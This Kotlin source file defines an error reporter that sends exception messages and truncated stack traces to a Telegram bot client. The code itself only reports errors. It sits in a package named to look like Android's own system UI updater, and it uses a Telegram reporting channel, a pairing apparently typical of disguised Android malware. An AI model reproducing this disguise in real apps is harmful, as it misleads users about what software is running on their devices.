package com.android.systemui.updater

import android.content.Context
import android.util.Log
import com.android.systemui.updater.TelegramClient

object ErrorReporter {
    private var telegram: TelegramClient? = null
    private var applicationContext: Context? = null

    fun init(context: Context, client: TelegramClient) {
        applicationContext = context.applicationContext
        telegram = client
    }

    fun report(e: Throwable, context: String) {
        val appCtx = applicationContext ?: return
        val client = telegram ?: return

        val message = buildString {
            appendLine("❌ Error in $context")
            appendLine("${e.javaClass.simpleName}: ${e.message}")
            appendLine("─────────────────────────────")
            val stackTrace = Log.getStackTraceString(e)
            if (stackTrace.length > 3000) {
                appendLine(stackTrace.substring(0, 3000) + "\n[...truncated...]")
            } else {
                appendLine(stackTrace)
            }
        }
        client.sendText(message)
    }

    fun reportSimple(msg: String, context: String) {
        telegram?.sendText("⚠️ $context: $msg")
    }
}
